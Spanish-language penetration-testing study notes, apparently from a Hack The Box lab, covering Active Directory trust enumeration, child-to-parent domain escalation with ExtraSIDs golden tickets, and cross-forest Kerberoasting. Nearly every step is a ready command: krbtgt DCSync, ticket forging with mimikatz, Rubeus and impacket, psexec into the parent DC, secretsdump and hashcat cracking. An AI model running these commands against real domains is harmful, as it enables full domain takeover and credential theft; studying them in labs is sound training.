## Enumerando relaciones de confianza
### **Get-ADTrust (Module `ActiveDirectory`)**
Nos muestra relaciones de confianza, dirección y tipo. Indica además si la confianza es transitiva o está limitado al bosque.
```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```
### Get-DomainTrust (`Powerview`)
Detalla los dominios de confianza y la relación del trust
```powershell
Import-Module PowerView.ps1
Get-DomainTrust
```
Además de este comando podemos utilizar `Get-DomainTrustMappig`, que identifica además puntos de movimiento lateral y ayuda a visualizar rutas de ataque con bloodhound
```powershell
Get-DomainTrustMapping
```
### Mostrando usuarios en child Domain con `Get-domainUser`
```powershell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

### Mostrar relaciones con `netdom` - `cmd`
Se puede ejecutar desde cmd y es nativa de Windows
- Mostrar relaciones de confianza
    ```powershell
    netdom query /domain:inlanefreight.local trust
    ```
- Mostrar DC
    ```powershell
     netdom query /domain:inlanefreight.local dc
    ```
- Mostrar workstations y servidores
    ```powershell
    netdom query /domain:inlanefreight.local workstation
    ```
## Escalada parent Domain con  extraSIDs attack
El ataque consiste en inyectar un SID de cuentas privilegiadas en el `sidHistory` de una cuenta comprometida con un golden ticket. Si el dominio padre no tiene SID Filtering habilitado, la cuenta comprometida podrá moverse lateralmente hacia el dominio padre. 
### Windows
#### Requisitos
- **Hash NT del KRBTGT del dominio hijo** (obtenido con DCSync).
    ```powershell
    mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt
    ```
- **SID del dominio hijo**.
    ```powershell
     Get-DomainSID
    ```
- **Nombre de un usuario objetivo** (puede ser inventado).
    ```powershell
    hacker
    ```
- **FQDN del dominio hijo**.
    ```powershell
    mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt
    ```
- **SID del grupo `Enterprise Admins` en el dominio raíz**.
    ```powershell
    Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
    ```
#### Ataque - Generación de golden ticket
##### Con mimikatz
- Con la información recolectad podemos crear un `Golden Ticket` con Mimikatz
    ```powershell
    kerberos::golden /user:<usuario> /domain:<dominio> /sid:<sid_child> /krbtgt:<hashkrbtgt> /sids:<sid_parent> /ptt
    kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
    ```
- Podemos comprobar que el ticket está en memoria:
    ```powershell
    klist
    ```
- Y mostrar el contenido de C del dc, por ejemplo:
    ```powershell
    ls \\\\academy-ea-dc01.inlanefreight.local\\c$
    ```
##### Con Rubeus
El siguiente comando, además de cargar el ticket en memoria lo mostrará en formato base64
```powershell
 .\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

### Linux
#### Automatizado - `raisechild`
Impacket tiene una heramienta llamada `raisechild`, que recopila toda la información necesaria por nosotros, por lo que solo tenemos que escribir:
```powershell
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
#### Sin automatizar
##### Requisitos
- **Hash NT del KRBTGT del dominio hijo**
    ```powershell
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
    #resultado del siguiente tipo
    usuario:RID:LM_hash:NT_hash:::
    ```
    - **`just-dc-user LOGISTICS/krbtgt`** – Extrae solo el hash de KRBTGT.
    - **`htb-student_adm`** – Cuenta con privilegios en el dominio hijo.
- **SID del dominio hijo**. Utilizaremos la herramienta [looksid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
    ```powershell
    python3 /opt/impacket/build/scripts-3.9/lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
    ```
- **Nombre de un usuario objetivo** (puede ser inventado).
    ```powershell
    hacker
    ```
- **FQDN del dominio hijo**.
    ```powershell
    LOGISTICS.INLANEFREIGHT.LOCAL
    ```
- **SID del grupo `Enterprise Admins` en el dominio raíz**.
    ```powershell
    python3 /opt/impacket/build/scripts-3.9/lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
    
    Password:
    [*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
    498: INLANEFREIGHT\\Enterprise Read-only Domain Controllers (SidTypeGroup)
    500: INLANEFREIGHT\\administrator (SidTypeUser)
    501: INLANEFREIGHT\\guest (SidTypeUser)
    502: INLANEFREIGHT\\krbtgt (SidTypeUser)
    512: INLANEFREIGHT\\Domain Admins (SidTypeGroup)
    513: INLANEFREIGHT\\Domain Users (SidTypeGroup)
    514: INLANEFREIGHT\\Domain Guests (SidTypeGroup)
    515: INLANEFREIGHT\\Domain Computers (SidTypeGroup)
    516: INLANEFREIGHT\\Domain Controllers (SidTypeGroup)
    517: INLANEFREIGHT\\Cert Publishers (SidTypeAlias)
    518: INLANEFREIGHT\\Schema Admins (SidTypeGroup)
    519: INLANEFREIGHT\\Enterprise Admins (SidTypeGroup)
    ```
    Como resultado sería: `S-1-5-21-3842939050-3880317879-2865463114-519` 
    Se hace la consulta con las credenciales del dominio hijo, `logistics.inlanefreight.local` al dominio raíz ( DC: 172.16.5.5)
##### Ataque
- Generación de golden ticket utilizando `ticketer.py`
	```powershell
	impacket-ticketer -nthash <hash_krbtgt> -domain <dominio_hijo> -domain-sid <sid_hijo> -extra-sid <sid_enterpriseAdmins> hacker
	impacket-ticketer -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
	```
	Genera un ticket con el nombre `hacker.ccache`
- Acceso al dominio raíz
	```bash
	export KRB5CCNAME=hacker.ccache psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
	```
- Volcado de credenciales (ej: usuario privilegiado `bross`)
	```bash
	secretsdump.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -just-dc-user bross
	```
## Cross-Forest Kerberoasting 
- En entornos con **relaciones de confianza entre bosques (forest trusts)**, es posible que un dominio permita a usuarios autenticarse y solicitar tickets de servicio (TGS) para acceder a recursos en otro dominio o bosque.
- Si hay cuentas con **SPNs expuestos** en el bosque remoto, los atacantes pueden solicitar estos tickets, exportarlos y **crackearlos offline** para obtener la contraseña de la cuenta de servicio objetivo.
### Windows 
- Enumerar cuentas con SPN en el dominio objetivo usando `Get-DomainUser`
    ```powershell
    Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
    ```
    
- Validar si la cuenta pertenece a `Domain Admins` o tiene privilegios elevados
    ```powershell
    Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
    ```
    
- Realizar Kerberoasting con `Rubeus` para solicitar tickets TGS.
    ```powershell
    .\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
    ```
    
- Crackear con hashcat
    ```powershell
    hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
    ```

### Linux
- Enumeración de cuentas SPN con `GetUsersSPN.py`
    ```powershell
    impacket-GetUserSPNs -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
    ```
    
- Con la flag `-requets` obtenemos el ticket TGT
    ```powershell
    impacket-GetUserSPNs -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
    ```
- Crackear con hashcat y opción `-13100`